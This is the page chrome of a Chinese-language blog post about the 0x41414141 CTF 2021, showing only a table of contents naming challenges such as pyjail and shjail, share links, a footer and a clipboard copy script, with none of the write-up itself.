      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x414141"><span class="toc-number">1.</span> <span class="toc-text">0x414141</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-CyberChef-%E5%88%86%E9%9B%A2%E6%AA%94%E6%A1%88"><span class="toc-number">1.1.</span> <span class="toc-text">使用 CyberChef 分離檔案</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-reader"><span class="toc-number">2.</span> <span class="toc-text">file_reader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pyjail"><span class="toc-number">3.</span> <span class="toc-text">pyjail</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shjail"><span class="toc-number">4.</span> <span class="toc-text">shjail</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&text=0x41414141 CTF 2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&title=0x41414141 CTF 2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&is_video=false&description=0x41414141 CTF 2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=0x41414141 CTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/2bef66b8.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&title=0x41414141 CTF 2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&title=0x41414141 CTF 2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&title=0x41414141 CTF 2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&title=0x41414141 CTF 2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&name=0x41414141 CTF 2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&t=0x41414141 CTF 2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 選單</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 文章目錄</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 頁首</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/zh-TW/">首頁</a></li>
         
          <li><a href="/zh-TW/archives/">文章</a></li>
         
          <li><a href="/writeups/">WriteUps</a></li>
         
          <li><a href="/tools/">工具</a></li>
         
          <li><a href="/about/">關於</a></li>
         
          <li><a href="/search/">搜尋</a></li>
        
        
        
        <li>
        
          <a href="/zh-CN">简</a>
        
          <a href="/en">En</a>
        
          <a href="#">正</a>
        
        </li>
      </ul>
    </nav>
  </div>
  <div class="footer-left">
    Copyright &copy;
    
    
    2018-2021
    LemonPrefect
    湘ICP备20002800号
    
      <img src="/images/beian.png"/>
      湘公网安备43021102000188号
    
    
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
